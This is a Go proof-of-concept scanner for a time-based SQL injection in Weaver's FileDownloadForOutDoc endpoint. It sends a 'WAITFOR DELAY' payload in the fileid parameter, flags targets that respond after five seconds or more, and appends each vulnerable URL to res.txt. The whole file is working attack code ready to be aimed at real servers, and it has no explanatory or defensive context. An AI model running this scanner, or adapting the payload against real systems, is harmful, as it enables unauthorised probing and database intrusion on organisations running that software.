package poc

import (
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

func FileDownloadForOutDocSQL(target string) {
	url := strings.TrimRight(target, "/")
	host := strings.ReplaceAll(strings.ReplaceAll(url, "https://", ""), "http://", "")
	header := http.Header{
		"Host":            []string{host},
		"User-Agent":      []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68"},
		"Accept-Encoding": []string{"gzip, deflate"},
		"Accept":          []string{"*/*"},
		"Connection":      []string{"keep-alive"},
		"Referer":         []string{"127.0.0.1:9999/wui/index.html"},
		"Content-Type":    []string{"application/x-www-form-urlencoded"},
		"Accept-Language": []string{"zh-CN,zh;q=0.9"},
		"Content-Length":  []string{"45"},
	}

	pocURL := url + "/weaver/weaver.file.FileDownloadForOutDoc"
	payload := fmt.Sprintf("isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:5'", randomInt(1000, 99999))
	client := http.Client{Timeout: 10 * time.Second}
	startTime := time.Now()
	response, err := client.Post(pocURL, "application/x-www-form-urlencoded", strings.NewReader(payload))
	if err != nil {
		log.Printf("ERROR: %s\n", err)
		return
	}
	defer response.Body.Close()
	response.Header = header

	if response.StatusCode == http.StatusOK {
		elapsed := time.Since(startTime)
		elapsedSeconds := elapsed.Seconds()

		if elapsedSeconds >= 5 {
			log.Println("[+] 存在 FileDownloadForOutDoc SQL注入")
			f, err := os.OpenFile("res.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
			if err != nil {
				fmt.Printf("ERROR: %s\n", err)
				return
			}
			defer f.Close()

			_, err = f.WriteString(pocURL + "\n")
			if err != nil {
				fmt.Printf("ERROR: %s\n", err)
				return
			}
		}
	} else {
		log.Printf("ERROR: 未知错误代码: %d\n", response.StatusCode)
	}
}

func randomInt(min, max int) int {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	return r.Intn(max-min+1) + min
}
